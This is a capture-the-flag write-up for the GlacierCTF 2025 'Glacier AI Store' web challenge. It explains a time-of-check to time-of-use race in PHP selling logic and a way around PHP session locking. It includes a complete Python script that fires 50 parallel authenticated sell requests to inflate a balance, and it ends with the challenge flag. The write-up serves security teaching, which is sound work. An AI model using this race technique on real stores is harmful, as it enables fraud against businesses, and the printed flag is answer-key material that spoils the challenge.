# ❄️ Glacier AI Store (50 points) (55 solves)

**CTF:** GlacierCTF 2025  
**Category:** Web  
**Technique:** TOCTOU Race condition, PHP Session Locking

## 📝 Introduction

Glacier AI Store is a web challenge featuring an online shop where users can buy and sell items. The ultimate goal is to purchase a "Flag" product that costs `1000` currency, far exceeding the initial balance of `1`. The application contains a Time-of-Check to Time-of-Use (TOCTOU) vulnerability in the selling logic, allowing users to sell an item multiple times before it is removed. However, exploiting this requires bypassing PHP's default session locking mechanism.

## 🔍 Reconnaissance & Analysis

### The Application Structure
The challenge provides source code for a web application. Key files include:
-   **`index.php`**: The main entry point, which sets up a chat-like interface.
-   **`assets/js/navigation.js`**: Handles client-side navigation.
-   **`/nav/index.php`**: The main server-side controller.
-   **`/helpers/*.php`**: Core logic for database, users, and products.

### Identifying the Goal
In `web/helpers/products.php`, the flag is defined as a product:
```php
"flag" => array(
    "title" => "Glacier Flag",
    "price" => 1000,
    "desc" => "...",
    "ordered_desc" => file_get_contents("/flag.txt"), // The goal!
    "img" => "/assets/img/glacierflag.png"
)
```
To get the flag, a user needed to purchase this item. However, the price was `1000`, and a new user starts with a balance of only `1`.

## 💥 The Vulnerability: TOCTOU Race Condition

The core vulnerability is a race condition in the logic for selling a product, located in `web/nav/pages/products.php`.

```php
$sell = $_POST["sell"];
$reason = $_POST["reason"];
if(isset($sell) && array_key_exists($sell, $products)) {
  $loginID = getLoginID();
  
  // 1. Time-of-Check
  if(!hasUserProduct($loginID, $sell)) goto product_list;

  // 2. Balance Increase
  increaseBalance($loginID, $products[$sell]["price"]);

  // 3. Artificial Delay
  if(isset($reason) && strlen($reason) > 0)
    respondText($USER, $reason);

  // 4. Time-of-Use (Deletion)
  sellProduct($loginID, $sell);
  goto product_list;
}
```

The `respondText` function introduces a delay (50ms per character). This creates a classic **Time-of-Check to Time-of-Use (TOCTOU)** vulnerability. The window between the balance increase and the product deletion allows multiple, parallel requests to all pass the initial check before the product is removed, increasing the user's balance for each successful request.

### The Obstacle: PHP Session Locking
Standard parallel requests (e.g., using Python threads sharing a session) fail because PHP locks the session file (`/tmp/sess_PHPSESSID`) for the duration of a request. Subsequent requests from the same session are queued, effectively serializing them and preventing the race.

## ⚔️ Exploitation

To bypass session locking while attributing the exploit to the same user account, we must create **multiple distinct sessions** that are all logged into the **same user account**.

### Strategy
1.  **Initialize Sessions**: Create 50 `requests.Session` objects and log in with the same user credentials for each one, collecting 50 unique `PHPSESSID` cookies.
2.  **Level Up**: Enter a loop:
    *   Determine the most valuable product affordable.
    *   Use one session to **buy** one unit.
    *   Unleash all 50 sessions in parallel to **sell** that single unit, each providing a `reason` to trigger the delay.
    *   The balance multiplies.
3.  **Capture the Flag**: Once the balance exceeds 1000, buy the flag.

## 🎓 Educational Takeaways

1.  **TOCTOU:** Operations that modify state (like deducting items) must happen atomically or be locked correctly relative to the checks.
2.  **PHP Session Locking:** By default, PHP serializes requests for the same session. This can mask race conditions during testing if the attacker uses a single session cookie.
3.  **Attack Sophistication:** Sometimes bypassing a race condition mitigation (even an accidental one like session locking) requires managing multiple authenticated contexts simultaneously.

## 🐍 Exploit

```python
import requests
import threading
import re
import time

# Use the local URL for the final exploit
BASE_URL = "https://glacier-ai-store.web.glacierctf.com"
LOGIN_URL = f"{BASE_URL}/nav/index.php?p=252"
STORE_URL = f"{BASE_URL}/nav/index.php?p=145"
PRODUCTS_URL = f"{BASE_URL}/nav/index.php?p=253"

USERNAME = "fat_cat"
PASSWORD = "password"
NUM_SESSIONS = 50

# Products ordered by price, descending
PRODUCTS = [
    {"name": "flag", "price": 1000},
    {"name": "jar", "price": 100},
    {"name": "water", "price": 10},
    {"name": "stone", "price": 1}
]

def get_balance(session):
    """Fetches and returns the current user balance, with retries."""
    for _ in range(3): # Retry up to 3 times
        try:
            r = session.post(PRODUCTS_URL, timeout=10)
            match = re.search(r'Current Balance: (\d+)', r.text)
            if match:
                return int(match.group(1))
        except requests.RequestException:
            time.sleep(0.5)
    return -1 # Return -1 if it fails after retries

def sell_product_race(session, product):
    """The target function for each thread; sells a product."""
    try:
        session.post(STORE_URL, data={"sell": product, "reason": "this_is_the_one"}, timeout=10)
    except requests.RequestException:
        pass

# --- Main Exploit Logic ---
print(f"[+] Registering user '{USERNAME}'...")
requests.post(LOGIN_URL, data={"form": "register", "username": USERNAME, "password": PASSWORD, "password_repeat": PASSWORD})

print(f"[+] Creating and authenticating {NUM_SESSIONS} parallel sessions...")
sessions = [requests.Session() for _ in range(NUM_SESSIONS)]
for i, sess in enumerate(sessions):
    sess.post(LOGIN_URL, data={"form": "login", "username": USERNAME, "password": PASSWORD})
print(f"[+] {len(sessions)} sessions are ready.")

main_session = sessions[0]
current_balance = get_balance(main_session)
print(f"[+] Starting balance: {current_balance}")

# Loop until we can afford the flag
while current_balance < PRODUCTS[0]["price"]:

    # Determine the best product we can afford to race with
    product_to_race = None
    for p in PRODUCTS:
        if current_balance >= p["price"]:
            product_to_race = p["name"]
            break

    if not product_to_race:
        print("\n\033[91m[-] Stall detected. Cannot afford any products to continue race.\033[0m")
        break

    print(f"\n[+] Current balance: {current_balance}. Purchasing 1x '{product_to_race}' to start next race...")

    # Buy one unit of the chosen product
    main_session.post(STORE_URL, data={"product": product_to_race})
    main_session.post(STORE_URL, data={"btn": "yes"})

    # Now, race to sell it
    print(f"[+] Racing to sell '{product_to_race}'...")
    threads = []
    for sess in sessions:
        t = threading.Thread(target=sell_product_race, args=(sess, product_to_race))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

    current_balance = get_balance(main_session)
    print(f"[+] Race finished. New balance: {current_balance}")
    time.sleep(0.1)

# Final step: Buy the flag
print("\n[+] Success! Balance should be sufficient for the flag.")
print("[+] Buying the flag...")
main_session.post(STORE_URL, data={"product": "flag"})
main_session.post(STORE_URL, data={"btn": "yes"})

print("[+] Fetching final product list...")
r = main_session.post(PRODUCTS_URL)
print("\n--- Start of Final Page ---")
print(r.text)
print("--- End of Final Page ---")

flag_match = re.search(r'(gctf\{[^\}]+})', r.text)
if flag_match:
    print(f"\n\033[92m[***] FLAG FOUND: {flag_match.group(0)}\033[0m")
else:
    print("\n\033[91m[-] Flag not found in the final product list.\033[0m")
```

## 🚩 Flag

`gctf{pHP_G3tZ_W3iRD_Wh3n_y0U_D!SsC0nN3Ct_m0K9Pa5shMpOO3Mq}`
